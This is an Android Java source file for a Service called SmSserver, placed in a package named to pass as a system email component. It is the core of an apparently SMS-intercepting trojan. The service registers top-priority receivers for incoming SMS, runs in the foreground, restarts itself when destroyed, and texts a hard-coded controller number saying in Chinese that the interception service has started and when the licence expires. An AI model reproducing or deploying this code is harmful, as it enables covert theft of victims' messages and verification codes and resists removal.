package com.android.system.emial;

import android.app.Notification;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.IBinder;
import android.util.Log;
import android.widget.RemoteViews;


public class SmSserver extends Service {

    public static final String SMS_RECEIVED = "android.provider.Telephony.SMS_RECEIVED";
    public static final String SMS_RECEIVED_2 = "android.provider.Telephony.SMS_RECEIVED_2";
    public static final String GSM_SMS_RECEIVED = "android.provider.Telephony.GSM_SMS_RECEIVED";
    public static final String SendState = "com.yfm.send";

    private SmSReceiver localMessageReceiver, localMessageReceiver2;

    @Override
    public void onCreate() {
        // TODO Auto-generated method stub
        super.onCreate();

//		if (SmSutils.key.equals(SmSutils.getPublicKey(this))) {

        Notification notification = new Notification(R.drawable.icon, "",
                System.currentTimeMillis());
        Intent notificationIntent = new Intent();
        notification.contentView = new RemoteViews(this.getPackageName(),
                R.layout.activity_main);
        PendingIntent pendingIntent = PendingIntent.getActivity(this, 0,
                notificationIntent, 0);
        notification.contentIntent = pendingIntent;
        startForeground(100, notification);
        IntentFilter localIntentFilter = new IntentFilter();
        localIntentFilter.addAction(SmSserver.SMS_RECEIVED);
        localIntentFilter.addAction(SmSserver.SMS_RECEIVED_2);
        localIntentFilter.addAction(SmSserver.GSM_SMS_RECEIVED);
        localIntentFilter.setPriority(1000);
        localMessageReceiver = new SmSReceiver();
        this.registerReceiver(localMessageReceiver, localIntentFilter, "android.permission.BROADCAST_SMS", null);

        localMessageReceiver2 = new SmSReceiver();
        this.registerReceiver(localMessageReceiver2, new IntentFilter(SmSserver.SendState));

        SmSutils su = new SmSutils();
        su.sendSMS(SmSutils.phone, "拦截服务已启动,软件到期时间" + SmSutils.endtime, null);

//		}
    }

    @Override
    public void onDestroy() {
        // TODO Auto-generated method stub
        super.onDestroy();
        this.stopForeground(true);
        this.unregisterReceiver(localMessageReceiver);
        this.unregisterReceiver(localMessageReceiver2);
        Intent localIntent = new Intent();
        localIntent.setClass(this, SmSserver.class); // 销毁时重新启动Service
        this.startService(localIntent);
        Log.i("销毁时重启", "onDestroy");
    }

    @Override
    public IBinder onBind(Intent arg0) {
        // TODO Auto-generated method stub
        return null;
    }


    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        // TODO Auto-generated method stub
        flags = START_REDELIVER_INTENT;
        return super.onStartCommand(intent, flags, startId);

    }


}
